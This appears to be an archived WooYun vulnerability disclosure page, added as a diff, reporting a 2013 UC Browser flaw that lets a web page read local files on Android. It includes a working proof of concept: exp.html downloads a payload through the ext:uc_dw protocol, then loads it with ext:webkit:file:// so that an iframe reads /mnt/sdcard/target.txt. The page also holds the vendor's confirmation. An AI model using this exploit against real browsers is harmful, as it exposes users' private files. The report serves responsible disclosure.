@@ -1,0 +1,214 @@
+﻿<!doctype html>
+                        <html lang="en">
+                        <head>
+	                        <meta charset="UTF-8">
+	                        <title>		UC浏览器跨本地域漏洞可获取本地文件内容  </title>
+	                        <link href="../css/css.css" rel="stylesheet" /> 
+                        </head>
+                        <body> 
+                        <ul><li>标题：		UC浏览器跨本地域漏洞可获取本地文件内容  </li><li>作者：		<a href="http://www.wooyun.org/whitehats/爱梅小礼">爱梅小礼</a> 
+</li><li>提交时间：		2013-12-09 15:58</li></ul>
+                        <div class="con">
+                        <h2>漏洞详情</h2>
+		<h3 class="detailTitle">披露状态：</h3>
+		<p class="detail" style="padding-bottom:0">
+					</p>
+		<p class="detail">
+									2013-12-09：	细节已通知厂商并且等待厂商处理中<br/>
+									2013-12-09：	厂商已经确认，细节仅向厂商公开<br/>
+									2013-12-12：	细节向第三方安全合作伙伴开放<br/>
+									2013-12-19：	细节向核心白帽子及相关领域专家公开<br/>
+									2013-12-29：	细节向普通白帽子公开<br/>
+									2014-01-18：	细节向实习白帽子公开<br/>
+									2014-03-09：	细节向公众公开<br/>
+					</p>
+		<h3 class="detailTitle">简要描述：</h3>
+
+		<p class="detail">跨本地域，可获取指定路径的的本地文件。</p>
+
+				
+						<h3 class="detailTitle">详细说明：</h3>
+		
+			<p class="detail">测试版本：V9.4.1.362<br />
+<br />
+ext:webkit协议可导致HTTP-&gt;file的跨域<br />
+<br />
+</p><pre><code>&lt;iframe src=ext:webkit:file:///mnt/sdcard/UCDownloads/localexec_payload.html&gt;&lt;/iframe&gt;</code></pre><p class='detail'><br />
+<br />
+为了更好的演示，写了个exp，思路比较常规：<br />
+<br />
+UC浏览器现在与Chrome类似，下载文件都没有提示，而且下载的文件为固定路径（/mnt/sdcard/UCDownloads/），这样我的思路就是先让浏览器将payload下载到本地，然后再跨本地域去执行它：<br />
+<br />
+<br />
+<br />
+exp.html：<br />
+<br />
+</p><pre><code>&lt;html&gt;<br />
+&lt;head&gt;&lt;title&gt;UC浏览器EXT协议跨域&lt;/title&gt;&lt;/head&gt;<br />
+&lt;body&gt;<br />
+&lt;iframe src=ext:uc_dw:http://127.0.0.1:8888/localexec_payload.html&gt;&lt;/iframe&gt;<br />
+&lt;/body&gt;<br />
+&lt;script&gt;<br />
+setTimeout(&quot;document.body.innerHTML=&#039;&lt;iframe src=ext:webkit:file:///mnt/sdcard/UCDownloads/localexec_payload.html&gt;&lt;/iframe&gt;&#039;&quot;,5000);<br />
+&lt;/script&gt;<br />
+&lt;/html&gt;</code></pre><p class='detail'><br />
+<br />
+ext:uc_dw协议是内置的下载文件的协议，即便是没有这个协议，也可以通过webserver的下载头实现下载html格式的文件。等待五秒钟，待下载完成后进行跨域执行localexec_payload.html。<br />
+<br />
+localexec_payload.html内容为：<br />
+<br />
+</p><pre><code>&lt;html&gt;<br />
+&lt;script&gt;function inject(){<br />
+var d = document.getElementById(&quot;hi&quot;).contentDocument || document.getElementById(&quot;hi&quot;).contentWindow.document<br />
+alert(d.body.innerHTML);<br />
+}<br />
+&lt;/script&gt;<br />
+&lt;iframe id=hi src=file:///mnt/sdcard/target.txt onload=inject()&gt;&lt;/iframe&gt;<br />
+&lt;/html&gt;</code></pre><p class='detail'><br />
+<br />
+其中target.txt便是我们要读取的本地文件。 </p>
+				
+									<h3 class="detailTitle">漏洞证明：</h3>
+
+			<p class="detail">再次拿出我的大华为P1，手机上搭建了个webserver<br />
+<br />
+。<br />
+<br />
+UC访问http://127.0.0.1:8888/exp.html<br />
+<br />
+显示有文件下载，如图所示：<br />
+<br />
+</p><p class="detail"><a href="../images/09154702fcb76b27553c8f3d7af64417f9fc8dbc.png" target="_blank"><img src="../images/09154702fcb76b27553c8f3d7af64417f9fc8dbc.png" alt="1.png" width="600"/></a></p><p class="detail"><br />
+<br />
+等待五秒钟后，获取到target.txt的内容并弹窗提示：<br />
+<br />
+</p><p class="detail"><a href="../images/09154807f9391fde23cf23a7c261bb2b3f05d14e.png" target="_blank"><img src="../images/09154807f9391fde23cf23a7c261bb2b3f05d14e.png" alt="2.png" width="600"/></a></p><p class="detail"> </p>
+
+									<h3 class="detailTitle">修复方案：</h3>
+			<p class="detail">很简单. </p>
+										<h3 class="detailTitle">版权声明：转载请注明来源 <a style="font-weight:normal" href="http://www.wooyun.org/whitehats/爱梅小礼" title="爱梅小礼">爱梅小礼</a>@<a style="font-weight:normal" href="http://www.wooyun.org/bugs/wooyun-2010-045390" title="UC浏览器跨本地域漏洞可获取本地文件内容">乌云</a></h3>
+		<hr align="center"/>
+
+				
+			<h2>漏洞回应</h2>
+			
+			
+															<h3 class="detailTitle">厂商回应：</h3>
+						<p class="detail">危害等级：中</p>
+						<p class="detail">漏洞Rank：10 </p>
+													<p class="detail">确认时间：2013-12-09 18:42</p>
+												<h3 class="detailTitle">厂商回复：</h3>				
+						<p class="detail">漏洞的确存在，已联系研发处理，非常感谢爱梅小礼提交的漏洞信息。</p>
+					
+
+					
+					
+					<h3 class="detailTitle">最新状态：</h3>
+
+											<p class="detail">暂无</p>
+					
+
+							
+					
+		
+<hr align="center" />
+<script type="text/javascript">
+var bugid="45390";
+var bugRating="-3";
+var myRating="";
+var ratingCount="2";
+
+
+
+function ShowBugRating(k){
+	var ratingItems=$(".myrating span");
+	$.each(ratingItems,function(i,n){
+		var nk=parseInt($(n).attr("rel"));
+		if(nk<=k){
+			$(n).addClass("on");
+		}else{
+			$(n).removeClass("on");
+		}
+	});
+	$(".myrating span").hover(
+		function(){
+			$("#ratingShow").html($(this).attr("data-title"));
+		},
+		function(){
+			$("#ratingShow").html("");
+		}
+	);
+}
+$(document).ready(function(){
+	if(myRating==""){
+		var ratingItems=$(".myrating span");
+		$(".myrating span").hover(
+			function(){
+				$(this).addClass("hover");
+				var k=parseInt($(this).attr("rel"));
+				$.each(ratingItems,function(i,n){
+					var nk=parseInt($(n).attr("rel"));
+					if(nk<k) $(n).addClass("on");
+					if(nk>k) $(n).removeClass("on");
+				});
+				$("#ratingShow").html($(this).attr("data-title"));
+			},
+			function(){
+				$(this).removeClass("hover");
+				if($("#myRating").val()==""){
+					$.each(ratingItems,function(i,n){
+						$(n).removeClass("on");
+					});
+				}
+				$("#ratingShow").html("");
+			}
+		);
+
+		$(".myrating span").click(function(){
+			var rating=$(this).attr("rel");
+			var k=parseInt($(this).attr("rel"));
+			$.post("/ajaxdo.php?module=bugrating",{"id":bugid,"rating":rating,"token":$("#token").val()},function(re){
+				//消除操作绑定
+				$(".myrating span").unbind();
+				re=parseInt(re);
+				switch(re){
+					case 1:
+						$("#ratingShow").html("评分成功");
+						$("#ratingSpan").html(parseInt($("#ratingSpan").html())+1);
+						$.each(ratingItems,function(i,n){
+							var nk=parseInt($(n).attr("rel"));
+							if(nk<=k){
+								$(n).addClass("on");
+							}else{
+								$(n).removeClass("on");
+							}
+						});
+						ShowBugRating(rating);
+						break;
+					case 2:
+						$("#ratingShow").html("请先登录");
+						break;
+					case 4:
+						$("#ratingShow").html("已对此漏洞进行过评分");
+						break;
+					case 6:
+						$("#ratingShow").html("不能对自己发布的漏洞进行评分");
+						break;
+					default:break;
+				}
+			});
+		});
+	}else{
+		if(ratingCount>2){
+			ShowBugRating(bugRating);
+		}else{
+			ShowBugRating(-3);
+		}
+	}
+});
+
+</script>
+<h3 class="detailTitle">漏洞评价：</h3>
+                        </div>
+                        </body>
+                        </html>
